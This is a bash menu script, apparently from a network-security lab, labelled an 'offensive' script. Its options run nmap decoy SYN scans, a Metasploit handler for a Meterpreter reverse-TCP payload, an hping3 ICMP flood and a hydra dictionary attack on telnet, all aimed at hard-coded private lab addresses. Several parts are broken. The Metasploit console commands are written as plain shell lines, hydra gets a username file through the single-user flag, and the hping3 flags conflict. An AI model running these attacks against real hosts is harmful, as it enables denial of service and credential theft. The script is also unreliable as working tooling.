#!/bin/bash

# vérifie que le script est exécuté en mode superutilisateur
if [ "$EUID" -ne 0 ]
  then echo "Veuillez exécuter le script en tant que superutilisateur."
  exit
fi


echo "Bienvenue dans le menu du script offensive"

# Create an array of options
options=("SYN, RST and ICMP attacks using nmap" 
    "Web services and database attacks using metasploit" 
    "Recognition attacks using hping and nmap"
     "Dictionary attack on telnet service using hydra"
     "Quit")



# Present menu with options
PS3="Please enter your choice: "
select opt in "${options[@]}"
do
    case $opt in
        "SYN, RST and ICMP attacks using nmap")
            # Perform task for SYN, RST and ICMP attacks using nmap
            echo "You chose SYN, RST and ICMP attacks using nmap"
            if ! command -v nmap &> /dev/null
        then
            echo "Nmap is not installed. Installing..."
            sudo apt install nmap
        else
            echo "Nmap is installed."
        fi
            nmap -D RND:100 -sS -n 192.168.10.10
            nmap -sS 192.168.10.10
		nmap -sP 192.168.10.10
            ;;
        "Web services and database attacks using metasploit")
        
            # Perform task for Web services and database attacks using metasploit
            echo "You chose Web services and database attacks using metasploit"

            
            #verify if Metasploit is installed
            if ! command -v msfconsole &> /dev/null
        then
            echo "Metasploit is not installed. Installing..."
            sudo apt install metasploit-framework
        else
            echo "Metasploit is installed."
        fi
                

    # Configure web services
    echo "Configuring web services..."
    sudo a2enmod rewrite
            
            
            echo "Starting Metasploit..."
            msfconsole

            echo "Setting up the attack..."
            use exploit/multi/handler
            set PAYLOAD windows/meterpreter/reverse_tcp
            set LHOST 192.168.10.10
            set LPORT 4444
            set RHOST 192.168.10.11

        
            exploit

            ;;
        "Recognition attacks using hping and nmap")
            # Perform task for Recognition attacks using hping and nmap
            echo "You chose Recognition attacks using hping and nmap"
            # Set up the attack
        echo "Setting up the attack..."
        hping3 --icmp --flood -S 192.168.10.10 && nmap -sP -O 192.168.10.10


            ;;
        "Dictionary attack on telnet service using hydra")
            # Perform task for Dictionary attack on telnet service using hydra
            echo "You chose Dictionary attack on telnet service using hydra"
             #verify if Metasploit is installed
            if ! command -v hydra &> /dev/null
        then
            echo "hydra is not installed. Installing..."
            sudo apt install hydra
        else
            echo "hydra is installed."
        fi
            git clone https://github.com/jeanphorn/wordlist.git
            cd wordlist
            hydra -l usernames.txt -P passlist.txt telnet://192.168.10.10
            ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
